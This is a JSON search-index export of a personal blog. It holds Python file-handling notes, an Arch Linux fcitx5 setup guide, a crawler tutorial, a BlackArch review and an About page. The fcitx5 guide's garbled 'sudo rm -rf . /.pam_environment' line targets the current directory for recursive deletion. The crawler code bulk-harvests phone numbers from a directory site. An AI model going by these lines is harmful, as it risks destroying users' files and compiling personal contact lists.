","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:1","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Reading Open a file in read-only mode: f = open(\"filename.txt\") This is equivalent to: f = open(\"filename\",\"rt\") “r” indicates to read “t” indicates that the file is text, this is the default setting for the function, so it can be omitted. Here’s a list from w3schools: There are four different methods (modes) for opening a file: “r” - Read - Default value. Opens a file for reading, error if the file does not exist “a” - Append - Opens a file for appending, creates the file if it does not exist “w” - Write - Opens a file for writing, creates the file if it does not exist “x” - Create - Creates the specified file, returns an error if the file exists In addition you can specify if the file should be handled as binary or text mode “t” - Text - Default value. Text mode “b” - Binary - Binary mode (e.g. images) For example, let’s say we have a file: /home/weepingdogel/test.txt --- Hello!I love Python. We can read the file without specifying the mode parameter: f = open('test.txt') print(f.read()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Or we can specify it: f = open('test.txt', 'rt') print(f.read()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:2","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Reading lines File: /home/weepingdogel/test.txt --- Hello!I love Python. Have a nice day! Good luck! When we encounter a multiline file, we can choose to read only one line at a time using f.readline() For example: f = open('test.txt') print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. If we need two lines: f = open('test.txt') print(f.readline()) print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! If we need three lines: f = open('test.txt') print(f.readline()) print(f.readline()) print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! This usage reads line by line and prints with line breaks. You may need it when reading configuration files… Of course, we can also use a for() loop to read all lines at once: f = open('test.txt') for x in f: print(x) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! I think using for is more efficient… ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:3","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Closing files Nothing much to say here… f = open('test.txt') print(f.read()) f.close() The effect is similar to the previous example. I won’t provide debugging results below, it’s too late. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:4","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Creating “x” indicates creating a new file. If the specified filename already exists, an error will be returned. f = open(\"test.txt\",\"x\") Try it out yourself, nothing much else. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:5","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Writing to a file The character 'a' represents adding content to an existing file without deleting or overwriting its original contents. For example: f = open(\"test.txt\",\"a\") f.write(\"加入内容 / content added.\") The above string will be added to the file. The character 'w' represents overwriting the file, which will replace any existing content. For example: f = open(\"test.txt\", \"w\") f.write(\"加入内容 / content added.\") In this case, only the string specified will exist in the file. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:6","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Deleting a file You need to use the os module and its os.remove() function. Simply type import os to import it. import os os.remove(\"test.txt\") Classic example Check if a file exists, delete it if it does, or display a message if it doesn’t. Deleting a directory Use os.rmdir(). import os os.rmdir(\"foldername\") ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:7","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Conclusion These are the basics of file read/write operations that you should know. If you’re having trouble understanding, you can try running the following code with different open() mode parameters. Summary code: import os import datetime def sign(): # Program identification print( ''' ╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮ ┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃ ┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃ ┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃ ╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮ ╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯ ╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃ ╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯ ''' ) def filecrt(filename): # File creation if os.path.exists(filename): # Check if the file exists print(str(datetime.datetime.now()) + \": The file already exists\") return 0 else: f = open(filename,'x') f.close() print(str(datetime.datetime.now()) + \": Created file: \" + filename) return 1 def filewrt(filename): fruits = ['apple', 'banana', 'strawberry','orange'] # Specify the contents to be written # File write operation f = open(filename, 'w') for fruit in fruits: f.write(fruit + '\\n') print(str(datetime.datetime.now()) + \": Writing: \" + fruit) f.close() def filedel(filename): # Delete file operation if os.path.exists(filename): os.remove(filename) print(str(datetime.datetime.now()) + \": Deleted file: \" + filename) else: print(str(datetime.datetime.now()) + \": \" + filename + \" does not exist\") def fileread(filename): print(str(datetime.datetime.now()) + \": Reading...\" ) f = open(filename,'r') print(\"-\" * 5 + \" File contents \" + \"-\" * 5 + \"\\n\") print(f.read()) print(\"-\" * 5 + \" File contents \" + \"-\" * 5 + \"\\n\") sign() if filecrt(\"test.txt\") == 0: fileread(\"test.txt\") filedel(\"test.txt\") else: filewrt(\"test.txt\") fileread(\"test.txt\") filedel(\"test.txt\") ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:2:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Problem solving"],"content":"If the input method is disabled after update, look here!!!","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"What happened I recently received a message like this For those who use $HOME/.pam_environment to set environment variables, take note! Due to CVE-2010-4708, pam upstream is set to not read user’s environment variable settings by default in version 1.4.0, and users are required to change their environment variable settings or restore the original default read behavior. ref: Linux environment variables how to set Evian’s Blog Why is the 10-year vulnerability only now fixed? Emmmm, so that’s what the vulnerability is. Emmmm, so that is .pam_environment this file can not be used …… Here thanks to lilydjwg for writing out the way to deal with various situations I’ll write a note about replacing fcitx5 in xfce + lightdm environment… Other specifics can be found in what lilydjwg wrote… (Escape ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:1:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"fcitx5 vs fcitx Fcitx Fcitx (Flexible Input Method Framework) ── i.e. Little Penguin Input Method, which is an input method distributed under GPL wiki/Input_method) platform, which can support multiple input methods by installing the engine, and supports simple input and output, it is a common Chinese input method in Linux OS. It has the advantage of being short and compact, and has good compatibility with programs. — Arch Wiki Fcitx5 Fcitx5 is the next generation input method framework after Fcitx. — Arch Wiki Daily lazy, direct quotes (flee ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:2:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Okay, let’s get right to it first post my system situation Operating system: Arch Linux Desktop environment: xfce Display Manager: lightdm Actually, just writing the input method environment variables from .pam_environment to .xprofile will solve the problem, but I’d like to try fcitx5. ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Uninstall the old version fcitx First of all, we need to uninstall the original fcitx, I was using fcitx-googlepinyin input method before, so I need to uninstall this package too, because there will be dependency. Besides, all the packages that have some relationship with fcitx should be uninstalled, otherwise pacman will report error, so you have to execute this (PS: you may not use Google input method, so please change fcitx-googlepinyin to the package name of the input method you installed) sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx Next, delete this file, it’s useless anyway (escape $ sudo rm -rf . /.pam_environment ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:1","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Installing fcitx5 Now to install fcitx5, this is how to do it fcitx5 The main package, no need to explain fcitx5-chinese-addons Chinese input method package …. Arch Wiki explains it like this. fcitx5-chinese-addons contains a lot of Chinese input methods: Pinyin, ShuangPin, WubiPinyin, Natural Code, CangJie, BingToad Holographic, ErBi, etc. fcitx5-im Environment dependency package, you have to install it, otherwise you can’t type on some software fcitx5-configtool fcitx5’s GUI configuration tool, because I don’t know how to modify the configuration file, so I installed this. Install it after the three above. Then, execute $ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool After the package is installed, it will theoretically boot up, but well, there can be some metaphysical problems, so do this manually first $ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:2","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Environment variables Well, finally it’s set environment variable, since .pam_environment can’t be used, where to write it? lilydjwg said: Using X11 desktop environment, usually login through display manager, such as lightdm and sddm. Both of them support ~/.xprofile. This file will be sourced during boot, using a shell determined by dm itself. Both lightdm and sddm use /bin/sh (in the files /etc/lightdm/Xsession and /usr/share/sddm/scripts/Xsession respectively). As you can see, in addition to reading .xprofile, lightdm also reads .profile. sddm even reads the startup configuration scripts for bash, zsh, tcsh, and fish. That is, we need to write the fcitx5 environment variables in the .xprofile file Then… $ vim . /.xprofile Write these things in it export INPUT_METHOD=fcitx5 export GTK_IM_MODULE=fcitx5 export QT_IM_MODULE=fcitx5 export XMODIFIERS=@im=fcitx5 Next you can choose to restart lightdm, $ sudo systemctl restart lightdm Or reboot the system. $ sudo reboot At this time, a keyboard appears in the status bar of xfce, but pressing CTRL + SPACE but it does not bring up the Chinese input method, so what should we do? Right-click the keyboard icon, click Configure, and then go to the QT configuration tool to add Chinese input methods on it! Just double click to add to the left ~ Then click OK and start enjoying fcitx5! ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:3","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Reference links How to set environment variables for Linux - Evian’s Blog Fcitx5 (Simplified Chinese) - ArchWiki Fcitx - Wikipedia Fcitx (Simplified Chinese) - ArchWiki Translated with www.DeepL.com/Translator (free version) ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:4:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Programming"],"content":"Although the website being crawled has been shut down...","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"A Casual Preface Hey, I’m back. Today, I set up hexo in my U-disk, so I can continue to update my blog. And this time I added a visitor counter to my blog. Feel free to help increase the count!～ So, in this post, I will introduce a simple web crawler implemented in Python. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:1:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Principles of Web Crawlers Beginner: Hey there, what is a web crawler? Expert: Go search it on a search engine. Beginner: I did, but I still don’t understand it. Expert: Uh…then keep reading… ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Overview To put it simply, a web crawler automates the process of browsing web pages to extract desired information and content from them. We all know that we use web browsers to access the Internet. So how do we visit a webpage? Here’s a brief overview (I’m too lazy to draw): Browser –Sends a request for www.bing.com–\u003e Server \u003c–Receives the request– Server –Responds with data–\u003e –Returns the data–\u003e Browser What? Still confused? Let’s take a look using a browser. Open any webpage. Using Chrome/Chromium as an example, right-click and select “Inspect”, then go to the “Network” tab, and check the “Preserve log” checkbox. Refresh the page and you’ll see the following content: As you can see, the browser displays the request content in great detail. And the left lists are the contents you retrieve from the website. A web crawler automates these processes so that we don’t need to visit websites manually to get the information we want. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:1","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"The Purpose of Web Crawlers For example, let’s say there is a website 全国号码段(链接已失效) where we need to obtain all the phone numbers of one of the phone number segments in a city, such as Xi’an. As you can see, there are many phone number segments, each with ten thousand phone numbers. What should we do? Can’t we copy and paste them one by one using the mouse, right? This is where web crawlers come into play. Actually, it can also be used to crawl my blog so that you can receive update information in a timely manner. Ah, please don’t hit me, it hurts! ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:2","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Choosing a Programming Language To perform web crawling, we need to use a programming language. The most commonly used one is Python because it is easy to use for web crawling. However, you can also choose other languages such as C/C++, Java, or even Visual Basic. The level of difficulty and coding methods may be different, but the purpose and functionality are the same. In this post, we will choose Python. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:3:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Installing Python Python is a cross-platform language, so installation methods differ depending on the platform. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Windows You can download the installation program from Python’s official website and install it. It is recommended to download Python 3. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:1","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Mac OSX Download it from Python’s official website ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:2","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Linux Install it via package manager. deb-based $ sudo apt-get install python3 Arch-based $ sudo pacman -S python rpm-based $ sudo yum install python3 ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:3","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Android Install QPython on the Android platform: Download it from Coolapk QPython Official Website ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:4","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Installing pip The installation programs for Windows and Mac OS X will automatically install pip, but Linux does not. We need to install it manually. What? You’re asking about Android? I don’t know either, hahaha. First, go to this website，and click Download，Download the second tar.gz file, which is a Linux compressed file. Then, extract it to get a pip-19.2.2 directory: $ tar -xvf pip-19.2.2.tar.gz Enter the directory: $ cd ./pip-19.2.2 There is a file called setup.py in there. Execute it using Python: $ sudo python setup.py Then pip will be installed automatically. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:5:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Required Modules The web crawler in this post uses the following modules: requests, for sending HTTP/1.1 requests BeautifulSoup, for parsing HTML and XML documents We can install them using the following command: $ sudo pip install requests BeautifulSoup If you find that the installation speed is slow, you can refer to this link to change the mirror source to a domestic one. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:6:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Public Code Here’s the code for a simple phone number crawler: from bs4 import BeautifulSoup import requests print(\"简易手机号码抓取工具 By WeepingDogel\") url=\"http://www.hiphop8.com/mobile/xian_1319339.html\" page=requests.get(url) page_info=page.content soup = BeautifulSoup(page_info, \"html.parser\") numbers = soup.find_all('a') with open(\"1319339.txt\",\"w\") as file: for number in numbers: print(number.string) file.write(str(number.string)+\"\\n\") You can copy the above code into a Python file and run or modify it as needed. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:7:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"In Conclusion I wrote this post in a hurry, so it may not be detailed enough. Please forgive me. There’s a comment section below, feel free to leave comments (or criticize me). ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:8:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Linux"],"content":"A nonsensical review of my experience with BlackArch...","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":" Today, I attempted to install BlackArch and spent quite a long time doing so. However, I later discovered that this system was not very perfect. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:0:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Advantages Firstly, let’s talk about its advantages: This thing integrates thousands of software packages, all of which are powerful tools. Secondly, this thing is cool, especially the wallpaper and color matching, which I think are particularly stunning. Its ease of installation is also a plus. Initially, I thought it would be more difficult to install than Arch, but after using it, I found that its installation process is ten times simpler than Arch. It’s just that I’m used to the manual style of Arch and not accustomed to this semi-automated approach. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:1:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Disadvantages Now, let’s talk about the disadvantages: First of all, the ISO is really too big. The official live ISO for BlackArch is 12GB, which took me a long time to download using IDM. The network installation package is the same size as Arch, but I haven’t tried it. What’s more alarming is that the minimum hard disk requirement for installing blackarch’s official mirrors is over 40GB, which makes it difficult for most people to meet this installation condition. Secondly, its desktop environment is too basic and its performance is particularly poor, especially for i3 and spectrwm, which are impossible to operate. Fluxbox is the coolest, but its habits are not suitable for most people. Openbox has nothing, and it’s even harder to operate. It also doesn’t support Chinese, which is very annoying. Also, the dependencies are too messy, making it difficult to switch to other desktop environments. For example, when I wanted to uninstall others and switch to xfce, I couldn’t uninstall them with “pacman -Rs”. I had to use “Rsc” to uninstall them, but as a result, I uninstalled “lxdm”, which prevented me from entering graphics mode. Later, when I installed “lxdm”, there was a major color bug. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:2:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Conclusion Firstly, it cannot be denied that BlackArch is a good thing for showing off, but I do not recommend using the official mirror (whether it is an online mirror or an offline live one) for installation, otherwise, you will end up like me. Secondly, users must have a foundation in the Arch series; otherwise, it will be a pitfall. It is recommended to install Arch first and then import BlackArch’s software library to install the full set of tools. Finally, please do not compare BlackArch with Kali or Parrot. They are not comparable in terms of tools. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:3:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":"about","content":"Once lost thing will never be able to come back.","date":"0001-01-01","objectID":"/about/","tags":["about"],"title":"About","uri":"/about/"},{"categories":"about","content":" Introduction Hello, I’m WeepingDogel, a college student. I’m Young, Male, Arch User, Python beginner Copyright Statement Unless otherwise noted, all articles on this website are original. This website follows the CC-BY-NC 4.0 license Please indicate the link when reprinting. Some articles use screenshots as covers, most article cover images are from wallhaven.cc. Comment You can leave a comment using the comment plugin below. Contact Links lilydjwg’s Blog 李皓奇 | liolok.com crzy233.github.io mushin2k’s blog Piggy’s Blog 欠陥電気の摸鱼小池 111的 Blog 首页-zhyjc6’s Blog Home | website_project ⑨BIE Garden in the Wonderland 欧式的Blog Dec KiraPGR’s Blog Lynnrin’s Blog poly000客栈 ","date":"0001-01-01","objectID":"/about/:0:0","tags":["about"],"title":"About","uri":"/about/"}]